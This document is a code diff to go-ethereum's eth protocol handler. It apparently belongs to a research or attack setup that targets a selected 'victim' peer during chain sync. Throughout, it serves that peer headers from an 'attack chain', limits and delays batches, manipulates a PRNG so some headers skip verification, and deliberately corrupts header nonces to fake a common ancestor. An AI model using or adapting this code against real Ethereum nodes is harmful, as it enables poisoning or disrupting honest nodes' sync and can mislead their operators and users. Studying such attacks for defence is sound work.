@@ -19,7 +19,7 @@ package eth
 import (
 	"encoding/json"
 	"fmt"
-	//"time"
+	"bytes"
 
 	"github.com/ethereum/go-ethereum/common"
 	"github.com/ethereum/go-ethereum/core"
@@ -32,6 +32,7 @@ import (
 )
 
 var attackChain *core.BlockChain
+var lastPartialBatchServed bool
 
 
 // handleGetBlockHeaders66 is the eth/66 version of handleGetBlockHeaders
@@ -67,7 +68,7 @@ func handleGetBlockHeaders66(backend Backend, msg Decoder, peer *Peer) error {
 		Reverse: q.Reverse,
 	}
 	chain := backend.Chain()
-	if bridge.MustUseAttackChain(bq) {
+	if bridge.MustUseAttackChain(bq, peer.Peer.ID().String()[:8]) {
 		chain = attackChain
 		log.Info("Using attack chain to fulfil it")
 	} else {
@@ -161,7 +162,7 @@ func serviceNonContiguousBlockHeaderQuery(chain *core.BlockChain, query *GetBloc
 			Reverse: query.Reverse,
 		}
 
-		if chain != attackChain && bridge.MustUseAttackChain(bq) {
+		if chain != attackChain && bridge.MustUseAttackChain(bq, peer.Peer.ID().String()[:8]) {
 			chain = attackChain 			// As we changed the bridge state (setting a victim), re-check whether
 											// we need to use attack chain
 			log.Info("Switched to attack chain because victim is now set")
@@ -187,7 +188,7 @@ func serviceNonContiguousBlockHeaderQuery(chain *core.BlockChain, query *GetBloc
 	}
 
 	skeleton := false
-	if !hashMode && query.Amount == 128 && query.Skip == 191 {
+	if !hashMode && query.Amount == 128 && query.Skip == 191 && bridge.IsVictim(peer.Peer.ID().String()[:8]) {
 		bridge.SetSkeletonStart(query.Origin.Number)
 		skeleton = true
 	}
@@ -234,7 +235,7 @@ func serviceNonContiguousBlockHeaderQuery(chain *core.BlockChain, query *GetBloc
 			pivotNumber = origin.Number.Uint64()
 		}
 
-		if bridge.StopMoving() && query.Origin.Number > bridge.FixedHead() && bridge.IsVictim(peer.Peer.ID().String()[:8]) {
+		if bridge.DoingSync() && bridge.StopMoving() && query.Origin.Number > bridge.FixedHead() && bridge.IsVictim(peer.Peer.ID().String()[:8]) {
 			log.Info("Limiting query results", "fixedHead", bridge.FixedHead(), "origin", query.Origin.Number)
 			break
 		}
@@ -323,7 +324,8 @@ func serviceContiguousBlockHeaderQuery(chain *core.BlockChain, query *GetBlockHe
 
 		from := query.Origin.Number
 
-		if bridge.IsVictim(peer.Peer.ID().String()[:8]) && bridge.StopMoving() &&
+		// Limit results during sync according to the fixed head
+		if bridge.DoingSync() && bridge.IsVictim(peer.Peer.ID().String()[:8]) && bridge.StopMoving() &&
 		from + count > bridge.FixedHead() && !query.Reverse {
 			count = bridge.FixedHead() - from + 1
 		}
@@ -350,8 +352,8 @@ func serviceContiguousBlockHeaderQuery(chain *core.BlockChain, query *GetBlockHe
 				bridge.ServedBatchRequest(query.Origin.Number, peer.Peer.ID().String()[:8])
 		 	}
 
-		 	if bridge.DoingSync() {
-		 		//bridge.MiniDelayBeforeServingBatch()
+		 	if bridge.DoingDelivery() {
+		 		bridge.DelayBeforeServingBatch()
 		 	}
 
 		 	/*
@@ -368,9 +370,11 @@ func serviceContiguousBlockHeaderQuery(chain *core.BlockChain, query *GetBlockHe
 		// as the head is fixed, it would be included in the skeleton, and therefore it would not be the last
 		// partial batch. This would then have length 0.
 		if len(headers) < 192 && !query.Reverse && bridge.DoingSync() &&
-		 bridge.IsVictim(peer.Peer.ID().String()[:8]) && bridge.ProvidedSkeleton() {	
+		 bridge.IsVictim(peer.Peer.ID().String()[:8]) && bridge.ProvidedSkeleton() && !lastPartialBatchServed {	
+		 	lastPartialBatchServed = true
 			log.Info("Delaying last partial batch")
 			bridge.DelayBeforeServingBatch()
+			bridge.LastPartialBatchServed()
 
 			// Mark PRNG steps, for last partial batch of sync phase.
 			bridge.StepPRNG(len(headers) - 1, 1)	// All headers will be verified, apart from the last two
@@ -378,7 +382,36 @@ func serviceContiguousBlockHeaderQuery(chain *core.BlockChain, query *GetBlockHe
 													// now, there is one additional (and useless) call to the PRNG (+1).
 													// So we have len(headers) -2 + 1 calls to the PRNG.
 
-			bridge.StepPRNG(3, 1)					// Mark last 2 headers in advance (+1 for useless call)
+			//bridge.StepPRNG(3, 1)					// Mark last 2 headers in advance (+1 for useless call)
+			bridge.CommitPRNG()
+		}
+
+		// Cheat about common ancestor
+		if bridge.DoingDelivery() && bridge.IsVictim(peer.Peer.ID().String()[:8]) &&
+		 query.Amount==1 && !bridge.AncestorFound() {
+			fakeCommonAncestor := bridge.FixedHead() - 2112
+		 	log.Info("Corrupting headers", "fakeCommonAncestor", fakeCommonAncestor)
+
+			var newHeaders []rlp.RawValue
+			for _, header := range headers {
+				h := new(types.Header)
+				s := rlp.NewStream(bytes.NewReader(header), uint64(len(header)))
+				s.Decode(h)
+				if h.Number.Uint64() > fakeCommonAncestor {
+					/*
+					b := h.Nonce[7]
+					b += 1
+					h.Nonce = append(h.Nonce[:7], b)	// Corruption
+					*/
+					h.Nonce[7]++
+				}
+				enc, err := rlp.EncodeToBytes(h)
+				if err != nil {
+					log.Crit("Cannot decode corrupt header", "err", err)
+				}
+				newHeaders = append(newHeaders, enc)
+			}
+			headers = newHeaders
 		}
 
 		return headers
